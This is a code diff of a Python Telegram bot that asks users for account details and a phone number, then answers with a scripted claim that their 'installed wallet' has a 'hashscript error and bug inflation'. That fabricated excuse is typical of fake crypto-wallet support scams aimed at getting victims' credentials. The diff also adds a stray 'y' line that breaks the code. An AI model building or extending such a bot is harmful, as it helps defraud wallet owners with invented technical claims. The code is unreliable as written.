@@ -32,8 +32,8 @@ def ask_account(update, context: CallbackContext):
 def first_question_step(update, context: CallbackContext):
     chat_id = update.message.chat_id
     phone_number = update.message.text
-    msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
-    bot.register_next_step_handler(msg, second_step)
+    update.message.reply_text('I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
+    
     return TWO
 
 def cancel(update, context: CallbackContext):
@@ -45,7 +45,7 @@ def second_step(message):
     msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
 
 
-
+y
 
 CH = ConversationHandler (entry_points = [CommandHandler("start", start)],
      states = {ONE : [MessageHandler(Filters.text , ask_account)],
